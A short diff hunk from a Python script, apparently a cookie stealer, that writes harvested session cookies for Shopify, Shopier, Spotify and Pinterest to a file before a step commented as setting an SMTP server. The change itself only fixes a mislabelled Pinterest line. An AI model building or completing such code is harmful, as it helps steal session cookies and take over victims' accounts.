@@ -114,7 +114,7 @@ def main():
         f.write(str(f"shopify: {spf_cookies}\n"))
         f.write(str(f"shopier: {spr_cookies}\n"))
         f.write(str(f"spotify: {sptfy_cookies}\n"))
-        f.write(str(f"spotify: {ptrst_cookies}\n"))
+        f.write(str(f"pinterest: {ptrst_cookies}\n"))
 
     #setting smtp server
 
